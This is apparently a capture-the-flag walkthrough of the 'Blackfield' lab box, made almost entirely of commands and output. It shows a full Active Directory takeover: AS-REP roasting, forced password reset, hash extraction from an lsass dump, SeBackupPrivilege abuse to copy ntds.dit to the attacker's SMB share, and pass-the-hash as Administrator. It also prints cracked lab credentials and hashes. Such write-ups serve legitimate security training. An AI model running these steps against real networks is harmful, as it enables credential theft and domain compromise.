# Blackfield

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -p- -sC -sV -T4 10.129.229.17             
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 13:44 EST
Nmap scan report for 10.129.229.17
Host is up (0.038s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-23 01:45:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m15s
| smb2-time: 
|   date: 2026-01-23T01:45:49
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

We get the box hostname

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb 10.129.229.17                                                                
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
```

Shares

```shellscript
┌──(kali㉿kali)-[~/Downloads/blackfield]
└─$ nxc smb dc01.blackfield.local -u '.' -p '' --shares                                                                                
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\.: (Guest)
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic                        Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON                        Logon server share 
SMB         10.129.229.17   445    DC01             profiles$       READ            
SMB         10.129.229.17   445    DC01             SYSVOL                          Logon server share
```

We enumerate users

```shellscript
┌──(kali㉿kali)-[~/Downloads/blackfield]
└─$ nxc smb dc01.blackfield.local -u '.' -p '' --rid-brute | grep -i user | awk '{print $6}' | grep -v + | sed 's/^BLACKFIELD\\//' > user.txt
```

We connect to the profiles$ share and also find potential usernames. We add them to the user list

```shellscript
┌──(kali㉿kali)-[~/Downloads/blackfield]
└─$ smbclient \\\\dc01.blackfield.local\\"profiles$" -U ''                                                                                   
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls 
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
  AKlado                              D        0  Wed Jun  3 12:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 12:47:11 2020
  AKollolli                           D        0  Wed Jun  3 12:47:11 2020
  AKruppe                             D        0  Wed Jun  3 12:47:11 2020
  AKubale                             D        0  Wed Jun  3 12:47:11 2020
  ALamerz                             D        0  Wed Jun  3 12:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 12:47:11 2020
  ...
  ...
  ...
```

We can then run kerbrute to enumerate valid usernames. We find the user support is AS-REP Roastable

```shellscript
┌──(kali㉿kali)-[~/Downloads/blackfield]
└─$ kerbrute userenum -d blackfield.local user.txt --dc dc01.blackfield.local

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 01/22/26 - Ronnie Flathers @ropnop

2026/01/22 14:10:25 >  Using KDC(s):
2026/01/22 14:10:25 >   dc01.blackfield.local:88

2026/01/22 14:10:30 >  [+] VALID USERNAME:       Guest@blackfield.local
2026/01/22 14:10:30 >  [+] VALID USERNAME:       DC01$@blackfield.local
2026/01/22 14:10:30 >  [+] support has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$support@BLACKFIELD.LOCAL:e1d191991ee865c122f39d83bd8ee501$e627380fd2c70c0919762c03caedba83c3fb84441424ae49906889c141a9eccb5c9cfda506a71c109dcc5151b3adefa0da01008ad91486032c289da0724a4d97ac49828f033a58d8d3dc11b9c100814d40cff4a62fc5008de19dc49605382c159e60a61389761bc51ab0d7c9a6f678a2a392859d0edcea660b7315c0a5a11d59a2d546063f4c801fc909395a1be7272dc9b3bc14e6772f2d03cbbc21ac81ca6c2a126ac5e264da9f838c23f19f6432be803318bf31aa3d527286a4917b826724be6d4429701c63a2962b596daabeadc11f77f8807a7ee40a12395adb08b6bf26e21e2ecdf017559ea296c81236c59b0724fb0c1aec0eef718887fd775b427d22327cca1a5fb4a310
```

We get his hash

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ GetNPUsers.py -dc-ip dc01.blackfield.local -no-pass blackfield.local/support
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for support
$krb5asrep$23$support@BLACKFIELD.LOCAL:d11e965b50edfaf377588e5e98affde5$06bda0b5278280b7ec5bc99d5193651a2fe0ba376a7db6fdc4d54aa2e824efdc0708fd79f9338503ebf3b8e2570ea77f770f9aa53046deca6507cc74fe128a506f634cb4b04ada5258d513fd412f2a744a64f4bf58867e517d5c03abdff05c2c53873993c661993fe97319ac14a184ad78497517e4f6be9aa2cc1dd340a343cc9df6f6edf5879e92dc56a269f6f677f1d564fff9a5c0e5649f76391f5a1fd12011e2d6abf479b710083675d6a1d696b1fa1ff20de77a02bc49a994ac5bf9f08f58eea901cc611dde5159ce225ad418a98421b5678625fce08cffd7a1029757d9baf045c5a76a9ef903cd186d85295e1731b975ba
```

We crack his hash

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ hashcat -m 18200 '$krb5asrep$23$support@BLACKFIELD.LOCAL:d11e965b50edfaf377588e5e98affde5$06bda0b5278280b7ec5bc99d5193651a2fe0ba376a7db6fdc4d54aa2e824efdc0708fd79f9338503ebf3b8e2570ea77f770f9aa53046deca6507cc74fe128a506f634cb4b04ada5258d513fd412f2a744a64f4bf58867e517d5c03abdff05c2c53873993c661993fe97319ac14a184ad78497517e4f6be9aa2cc1dd340a343cc9df6f6edf5879e92dc56a269f6f677f1d564fff9a5c0e5649f76391f5a1fd12011e2d6abf479b710083675d6a1d696b1fa1ff20de77a02bc49a994ac5bf9f08f58eea901cc611dde5159ce225ad418a98421b5678625fce08cffd7a1029757d9baf045c5a76a9ef903cd186d85295e1731b975ba' /usr/share/wordlists/rockyou.txt

support:#00^BlackKnight
```

We validate the creds

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc01.blackfield.local -u support -p '#00^BlackKnight'                        
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
```

Run bloodhound ⇒ couldn't make ldap work with nxc ⇒ used rusthound

```shellscript
┌──(kali㉿kali)-[~/Downloads/blackfield]
└─$ rusthound -u support -p '#00^BlackKnight' -z -n 10.129.229.17 -f DC01 -d BLACKFIELD.LOCAL -c All
---------------------------------------------------
Initializing RustHound-CE at 14:26:05 on 01/22/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-01-22T19:26:05Z INFO  rusthound_ce] Verbosity level: Info
[2026-01-22T19:26:05Z INFO  rusthound_ce] Collection method: All
[2026-01-22T19:26:05Z INFO  rusthound_ce::ldap] Connected to BLACKFIELD.LOCAL Active Directory!
[2026-01-22T19:26:05Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-01-22T19:26:05Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-22T19:26:06Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=BLACKFIELD,DC=local
[2026-01-22T19:26:06Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-22T19:26:08Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=BLACKFIELD,DC=local
[2026-01-22T19:26:08Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-22T19:26:08Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
[2026-01-22T19:26:08Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-22T19:26:09Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=BLACKFIELD,DC=local
[2026-01-22T19:26:09Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-22T19:26:09Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=BLACKFIELD,DC=local
[2026-01-22T19:26:09Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-01-22T19:26:09Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2026-01-22T19:26:09Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-01-22T19:26:09Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-01-22T19:26:09Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-01-22T19:26:09Z INFO  rusthound_ce::json::maker::common] 316 users parsed!
[2026-01-22T19:26:09Z INFO  rusthound_ce::json::maker::common] 60 groups parsed!
[2026-01-22T19:26:09Z INFO  rusthound_ce::json::maker::common] 18 computers parsed!
[2026-01-22T19:26:09Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-01-22T19:26:09Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-01-22T19:26:09Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-01-22T19:26:09Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-01-22T19:26:09Z INFO  rusthound_ce::json::maker::common] .//20260122142609_blackfield-local_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 14:26:09 on 01/22/26! Happy Graphing!
```

Support user has force change password over audit

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fl0ymDNG9rfFo2elMrEDW%2Fimage.png?alt=media&#x26;token=e204552c-e66c-4237-876c-849111f656ef" alt=""><figcaption></figcaption></figure>

Change the password and validate the creds

```shellscript
┌──(kali㉿kali)-[~/Downloads/blackfield]
└─$ bloodyAD --host dc01.blackfield.local -d "blackfield.local" -u "support" -p '#00^BlackKnight' set password "audit2020" "Hacked@123"
[+] Password changed successfully!
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads/blackfield]
└─$ nxc smb dc01.blackfield.local -u 'audit2020' -p 'Hacked@123'
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:Hacked@123
```

The audit2020 user has read over the forensic share

```shellscript
┌──(kali㉿kali)-[~/Downloads/blackfield]
└─$ nxc smb dc01.blackfield.local -u 'audit2020' -p 'Hacked@123' --shares 
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:Hacked@123 
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.229.17   445    DC01             profiles$       READ            
SMB         10.129.229.17   445    DC01             SYSVOL          READ            Logon server share
```

Inside the memory analysis folder, we find an lsass dump. We take it to our machine

```shellscript
smb: \memory_analysis\> ls 
  .                                   D        0  Thu May 28 16:28:33 2020
  ..                                  D        0  Thu May 28 16:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
```

After unzipping it, we get a .dmp file. We can use pypykatz to extract its contents

```shellscript
┌──(kali㉿kali)-[~/Downloads/blackfield]
└─$ unzip lsass.zip  
Archive:  lsass.zip
  inflating: lsass.DMP
  
┌──(kali㉿kali)-[~/Downloads/blackfield]
└─$ pypykatz lsa minidump lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
```

We get the hash for the user svc\_backup

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc01.blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d                
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d
```

He can winrm

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc winrm dc01.blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d                                                                                  
WINRM       10.129.229.17   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local) 
WINRM       10.129.229.17   5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```

Log in with winrm

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ evil-winrm -i dc01.blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents>
```

svc\_backup is part of the Backup Operators group

```shellscript
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
```

The privilege is enabled

```shellscript
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
```

We can make a shadow copy of the NTDS.dit file and then extract hashes

<mark style="background-color:$danger;">I had to add # at the end of each line or I would constantly get an error saying my syntax was wrong ⇒ it was a line break thing</mark>

```shellscript
C:\Users\svc_backup\desktop>diskshadow
diskshadow
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  1/22/2026 8:57:43 PM


DISKSHADOW> set verbose on#

DISKSHADOW> set metadata C:\Windows\Temp\meta.cab#

DISKSHADOW> set context clientaccessible#

DISKSHADOW> set context persistent#

DISKSHADOW> begin backup#

DISKSHADOW> add volume C: alias cdrive#

DISKSHADOW> create#
Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.
Component "\BCD\BCD" from writer "ASR Writer" is excluded from backup,
because it requires volume  which is not in the shadow copy set.
The writer "ASR Writer" is now entirely excluded from the backup because the top-level
non selectable component "\BCD\BCD" is excluded.

* Including writer "Task Scheduler Writer":
        + Adding component: \TasksStore

* Including writer "VSS Metadata Store Writer":
        + Adding component: \WriterMetadataStore

* Including writer "Performance Counters Writer":
        + Adding component: \PerformanceCounters

* Including writer "System Writer":
        + Adding component: \System Files
        + Adding component: \Win32 Services Files

* Including writer "WMI Writer":
        + Adding component: \WMI

* Including writer "COM+ REGDB Writer":
        + Adding component: \COM+ REGDB

* Including writer "NTDS":
        + Adding component: \C:_Windows_NTDS\ntds

* Including writer "DFS Replication service writer":
        + Adding component: \SYSVOL\B0E5E5E5-367C-47BD-8D81-52FF1C8853A7-A711151C-FA0B-40DD-8BDB-780EF9825004

* Including writer "Registry Writer":
        + Adding component: \Registry

Alias cdrive for shadow ID {37b62f4c-6270-4ef7-9a6f-15ee9fd2da07} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {875f52bf-150a-4b87-87ad-cb4f20e8989a} set as environment variable.
Inserted file Manifest.xml into .cab file meta.cab
Inserted file BCDocument.xml into .cab file meta.cab
Inserted file WM0.xml into .cab file meta.cab
Inserted file WM1.xml into .cab file meta.cab
Inserted file WM2.xml into .cab file meta.cab
Inserted file WM3.xml into .cab file meta.cab
Inserted file WM4.xml into .cab file meta.cab
Inserted file WM5.xml into .cab file meta.cab
Inserted file WM6.xml into .cab file meta.cab
Inserted file WM7.xml into .cab file meta.cab
Inserted file WM8.xml into .cab file meta.cab
Inserted file WM9.xml into .cab file meta.cab
Inserted file WM10.xml into .cab file meta.cab
Inserted file DisFB90.tmp into .cab file meta.cab

Querying all shadow copies with the shadow copy set ID {875f52bf-150a-4b87-87ad-cb4f20e8989a}

        * Shadow copy ID = {37b62f4c-6270-4ef7-9a6f-15ee9fd2da07}               %cdrive%
                - Shadow copy set: {875f52bf-150a-4b87-87ad-cb4f20e8989a}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 1/22/2026 8:58:55 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1

DISKSHADOW> expose %cdrive% E:#
-> %cdrive% = {37b62f4c-6270-4ef7-9a6f-15ee9fd2da07}
The shadow copy was successfully exposed as E:\.

DISKSHADOW> end backup#
```

We import dlls to copy files

```shellscript
PS C:\Users\svc_backup\desktop> Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\Users\svc_backup\desktop> Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

Copy the backup to a directory we have control over

```shellscript
PS C:\Users\svc_backup\desktop> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Users\svc_backup\ntds.dit
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Users\svc_backup\ntds.dit
Copied 18874368 bytes
```

Copy the file to our attack box

```shellscript
┌──(kali㉿kali)-[~/Downloads/blackfield]
└─$ smbserver.py share -smb2support .

S C:\Users\svc_backup> copy ntds.dit \\10.10.14.10\share\ntds.dit
copy ntds.dit \\10.10.14.10\share\ntds.dit
```

We also need the SYSTEM hive ⇒ we have the privilege to back it up

```shellscript
PS C:\Users\svc_backup> reg save hklm\system C:\Users\svc_backup\system
reg save hklm\system C:\Users\svc_backup\system
The operation completed successfully.
```

Dump hashes

```shellscript
┌──(kali㉿kali)-[~/Downloads/blackfield]
└─$ secretsdump.py -ntds ntds.dit -system system LOCAL 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
```

We can now login with PtH

```shellscript
┌──(kali㉿kali)-[~/Downloads/blackfield]
└─$ evil-winrm -i dc01.blackfield.local -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
